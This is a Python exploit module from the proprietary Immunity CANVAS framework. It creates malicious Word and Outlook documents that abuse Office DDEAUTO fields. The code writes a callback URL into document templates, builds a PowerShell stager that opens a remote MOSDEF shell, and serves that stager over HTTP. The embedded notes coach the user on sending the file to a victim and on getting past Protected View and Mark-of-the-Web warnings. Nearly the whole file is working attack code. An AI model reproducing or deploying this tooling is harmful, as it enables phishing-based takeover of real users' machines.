#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2016
#http://www.immunityinc.com/products/canvas/index.html for more information

import sys
import time
import socket

#covers both angles
if "." not in sys.path: sys.path.append(".")


from tcpexploit import tcpexploit
from libs.canvasos import canvasos
from exploitutils import *
from ExploitTypes.CommandLineExecuter import CommandExploit

from MOSDEF.cc import cc_main, threadsafe_cc_main
from canvasengine import canvas_root_directory
import canvasengine

import random
import string
import struct
import base64
import shutil
import zipfile


sys.path.append(os.path.join(canvas_root_directory, "libs", "compressed_rtf"))
sys.path.append(os.path.join(canvas_root_directory, "libs", "olefile"))

import OleFileIO_PL
from compressed_rtf import decompress as tnef_decompress
from compressed_rtf import compress as tnef_compress


from Nodes.mosdef_powershell.mosdef_powershell import *
from canvasengine import canvas_root_directory

NAME                           = "Microsoft Office DDE Clientside Code Execution"
DESCRIPTION                    = "Microsoft Office Multi-format Code-executing Document Creator and Server"
DOCUMENTATION                  = {}
DOCUMENTATION['VENDOR']        = "https://office.com"
DOCUMENTATION["Repeatability"] = "Infinite"
DOCUMENTATION["CVE Name"]      = ""
DOCUMENTATION["CVE URL"]       = ""
DOCUMENTATION["References"]    = "https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/"

DOCUMENTATION['Notes']         = """
Not considered a bug as of 10/31/2017

Send the resulting document to someone and have them open it. If the
target is vulnerable, and they click through the right dialog boxes,
you will get a Powershell-MOSDEF shell.

Word notes: The victim will have to click through a Protected View
"Enable Editing" popup, as well as an 'Update Content' popup, and
subsequently a  very carefully crafted dialog asking them if they want
to run to open a form. Note: If you are able to avoid getting marked
with MOTW you may be able to avoid the 'Enable Content' step.

Outlook notes: Outlook does not support Protected View!!! That means that
if you're able to get a malicious .msg file to the victim (likely via
email - we see .msg files forwarded around a lot, too!) and they double
click on it, there will be *no warning whatsoever* before the 'Update
Content' popup. Subsequently there will be a crafted message asking if
they want to acknowledge receipt of the message. If the target clicks
'yes', MOSDEF will eventually load. There will be a 3rd message, but
it has no bearing on whether MOSDEF loads.

We take a few steps to ensure you make the most of your compromise:
- The subsequent "failed data source" message is automatically closed***
- We use a DCOM trick to launch powershell under explorer.exe without
  standard code injection techniques. Subsequently, we send PS-MOSDEF
  to that process via a named pipe.

Protected View is triggered when the presence of MOTW ("Mark of the Web") is
found 'inside' a file. In the Windows Operating System, MOTW is an alternate
datastream (ADS) whose name is Zone.Information. Applications are supposed
to apply MOTW to files that come from any untrusted source. The ADS contains
the name of the zone of the file's origin. It is used as a hint to
applications to not trust the file's contents.

*** 11/14/2017 - This trick is an active engineering effort. It is not yet
refined and causes some serious problems for the Outlook exploit, so I have
disabled it.

Tested Operating Systems:
* Office 365 (all patches) - Windows 10 64 bit (Word)
* Office 2013 (no patches) - Windows 7 32 bit (Word / Outlook)

Special thanks to
- Mike Czumak for his message obfuscation post:
https://twitter.com/SecuritySift/status/918563308541829120
- Dmitry Alimov for his RTF compression work
https://github.com/delimitry/compressed_rtf
- enigma0x for his explorer-launching payload
https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/
- Philippe Lagadec / Fredrik Lundh for their OLE file library
https://www.decalage.info/olefile
- Alex McGeorge and Dave Aitel for phishing strategies
"""

VERSION                        = "1.0"
PROPERTY                       = {}
PROPERTY['TYPE']               = "Exploit"
PROPERTY['SITE']               = "Clientside"
PROPERTY['ARCH']               = [ ["Windows"] ]
PROPERTY['VERSION']            = [ "All" ]

class theexploit(tcpexploit, CommandExploit):
    def __init__(self):
        tcpexploit.__init__(self)
        CommandExploit.__init__(self)
        self.use_local_interface = False
        self.clientversion = None
        self.filename = None
        self.version = 1
        self.autoFind = False

    def displayVersions(self):
        for v in self.versions.keys():
            logging.info("Version %d: %s" % (v, self.versions[v][0]))

    def setVersions(self):
        self.versions = {}
        self.versions[1] = ("Word DDEAUTO Method", None)
        self.versions[2] = ("Outlook DDEAUTO Method", None)


    def getargs(self):
        self.getarg("filename")
        if self.filename == "AUTOGENERATE":
            self.filename = None

        self.clientversion   = self.argsDict.get("clientversion_radiobutton_value", self.clientversion)
        self.outlook_source_path = os.path.join(os.path.dirname(__file__),
                                                "Resources",
                                                self.argsDict.get("outlook_source_name"))


        if not self.clientversion:
            logging.warning("client version not found, using version %s" % str(self.versions[1][0]))
            self.clientversion=1
        else:
            logging.info("Client version: %s" % self.clientversion)
            if "Word DDEAUTO Method" in self.clientversion:
                self.clientversion = 1
                self.file_ext = "docx"
            elif "Outlook DDEAUTO Method" in self.clientversion:
                self.clientversion = 2
                self.file_ext = "msg"


    def neededListenerTypes(self):
        return [canvasengine.UNIVERSAL_MOSDEF]


    def read_request(self, handle):
        state = 0
        terminator = "\r\n\r\n"

        while state <= 3:
            i = handle.recv(1)
            if i == terminator[state]:
                state += 1
            else:
                state = 0

        return

    def get_replacers(self, text):
        replacers = set([])
        state = 0
        replacer_allowed_chars = ["_"]
        replacer_allowed_chars.extend(string.ascii_letters)

        current = []

        for i in text:
            if state == 0:
                if i == "{":
                    current.append(i)
                    state = 1
            elif state == 1:
                if i.isspace() or i not in replacer_allowed_chars:
                    state = 0
                    if i == "}":
                        current.append(i)
                        if len(current) != 2:
                            replacers.add("".join(current))
                    current = []
                else:
                    current.append(i)

        return replacers

    def random_string(self, chars=5):
        """
        Return a string that contains CHARS number of random alphabetic
        characters.
        """
        choices = []
        for _ in range(chars):
            choices.append(random.choice(string.ascii_letters))

        return "".join(choices)

    def generate_outlook_ddeauto(self, source_path, file_name, port=8081):
        template_path = os.path.join(os.path.dirname(__file__), "Resources", "template_final_dde.msg")

        final_path = None
        if file_name is None:
            final_path = os.path.join(canvas_root_directory, "looking_bad_%d.msg" % random.randint(100, 50000))
        else:
            final_path = os.path.join(canvas_root_directory, file_name)

        logging.info("outputting evil message to path:%s" % final_path)
        shutil.copy(template_path, final_path)

        # NN: ALWAYS USE SINGLE QUOTES WITH THESE PATHS! For some reason
        # OleFileIO_PL won't see the path unless it is wrapped with single, not double quotes

        source_handle = OleFileIO_PL.OleFileIO(source_path)
        # Yes this really does seem to be the path for the TNEF encoded RTF message
        # "LZFu" are magic bytes if it's compressed, "MELA" are magic bytes if not

        tnef_data = None
        with source_handle.openstream('__substg1.0_10090102') as handle:
            tnef_data = handle.read()

        message = tnef_decompress(tnef_data)
        start_idx = message.find("EXPLOIT_STAGER_URL")
        end_idx = message.find("'", start_idx)
        replacer = message[start_idx:end_idx]

        callback_ip = self.callback.ip

        start = "http://" + callback_ip + (":%d/" % port)
        end = self.random_string(5)


        url = start + end

        final_msg = message.replace(replacer, url)

        final_first = tnef_compress(final_msg)

        x = OleFileIO_PL.OleFileIO(final_path, write_mode=True)

        if len(final_first) > x.get_size('__substg1.0_10090102'):
            logging.error("compressed message size in source message (%d bytes) (from %s)" % (len(final_first), source_path))
            logging.error("is greater than the space available in the template: (%d bytes) (in %s)", (x.get_size('__substg1.0_10090102'), final_path))
            logging.error("stream name: '__substg1.0_10090102'")

        final_rest = "\x00" * (x.get_size('__substg1.0_10090102') - len(final_first))
        final_compressed = final_first + final_rest

        x.write_stream('__substg1.0_10090102', final_compressed)
        x.close()

        return final_path, port


    def generate_word_ddeauto(self, file_name=None, port=8081):
        template_path = os.path.join(os.path.dirname(__file__),"Resources","ddeauto_template.docx")

        file_path = None
        if not file_name:
            final_path = os.path.join(canvas_root_directory, "ddeathwish_%d.docx" % random.randint(0, 10000))
        else:
            final_path = os.path.join(canvas_root_directory, file_name)

        shutil.copy(template_path, final_path)

        # read the file to do the replacement
        doc_path = 'word/document.xml'
        zip_reader = zipfile.ZipFile(template_path)
        # print zip_reader.namelist()
        doc_handle = zip_reader.open(doc_path, "r")
        doc_data = doc_handle.read()

        logging.info("port:" + str(port))

        doc_data = doc_data.replace("EXPLOIT_STAGER_URL", "http://" + self.callback.ip + ":" + str(port) + "/" + self.random_string(10))

        doc_handle.close()

        # subsequently write the modified wsdl to disk
        zip_writer = zipfile.ZipFile(final_path, "w")
        zip_object = zipfile.ZipInfo()
        zip_object.filename = doc_path

        # ensure rw-rw-rw
        zip_object.external_attr = 0666 << 16L
        zip_object.compress_type = zipfile.ZIP_DEFLATED

        zip_writer.comment = zip_reader.comment

        for zobject in zip_reader.infolist():
            if not zobject.filename.endswith(doc_path):
                zip_writer.writestr(zobject,
                                    zip_reader.read(zobject.filename))
            else:
                zip_writer.writestr(zip_object, doc_data)

        zip_reader.close()
        zip_writer.close()


        return final_path, port

    def generate_stager(self, port):
        stager_template = None

        ps_mosdef = mosdef_powershell(self)

        powershell_string = ps_mosdef.createMosdefCallback().replace("\n", "\r\n")
        # generateEncPSCommand results in a HUGE argument that gets cut off by
        # our bug's process running code. Compression would be incompatible with older
        # powershell versions.

        with open(os.path.join(os.path.dirname(__file__), "Resources", "stager_template"), "rb") as handle:
            stager_template = handle.read()

        replacers = self.get_replacers(stager_template)

        ignored_replacers = ["{psmosdef_byte_array}",
                             "{ENTER}"]

        for replacer in replacers:
            if replacer not in ignored_replacers:
                stager_template = stager_template.replace(replacer, self.random_string(5))
            elif replacer == "{psmosdef_byte_array}":
                stager_template = stager_template.replace(replacer, ",".join(["%d" % ord(x) for x in powershell_string]))

        return stager_template

    def set_up_webserver(self, port, stager_data):
        app=self.engine.getModuleExploit("httpserver")
        app.link(self)
        app.argsDict["port"]=port
        app.argsDict["singleexploit"]="upload"
        app.argsDict["sourcedata"]=stager_data
        ret=app.listen()
        self.server=app
        return ret

    def run(self):
        self.getargs()
        self.host = self.target.interface

        port = random.randint(1025, 0xffff)

        if self.clientversion == 1:
            doc_path,port = self.generate_word_ddeauto(self.filename, port)
            logging.info("dropping malicious Word/DDEAUTO file to CANVASROOT:")
            logging.info(doc_path)
        elif self.clientversion == 2:
            doc_path,port = self.generate_outlook_ddeauto(self.outlook_source_path,
                                                          self.filename,
                                                          port)
            logging.info("dropping malicious Outlook/DDEAUTO file to CANVASROOT:")
            logging.info(doc_path)

        logging.info("Hosting powershell stager on port: %d" % (port))

        stager_data = self.generate_stager(port)

        with open(os.path.join(canvas_root_directory, "stager.ps1"), "wb") as handle:
            handle.write(stager_data)

        logging.info("Now starting powershell stager server...")

        try:
            self.set_up_webserver(port, stager_data)
        except Exception as e:
            logging.error("unable to set up webserver - could not bind to port %d" % port)
        else:
            while  self.state != "HALT":
                self.server.accept()

        logging.info("exiting...")


if __name__ == '__main__':
    logging.info("Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)
